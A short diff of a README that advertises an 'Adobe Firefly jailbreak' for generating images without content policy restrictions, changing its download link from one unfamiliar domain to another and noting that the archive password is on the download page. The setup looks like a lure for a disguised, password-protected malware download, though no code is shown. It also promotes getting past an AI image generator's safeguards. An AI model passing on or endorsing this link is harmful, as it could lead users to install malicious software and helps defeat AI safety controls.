@@ -18,7 +18,7 @@ Adobe Firefly jailbreak — generates any image without content policy restricti
 
 ## Download
 
-[![Download v4.0](https://img.shields.io/badge/Download_v4.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/fireflyjb2)
+[![Download v4.0](https://img.shields.io/badge/Download_v4.0-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/fireflyjb2)
 
 > The archive password is shown on the download page.
 
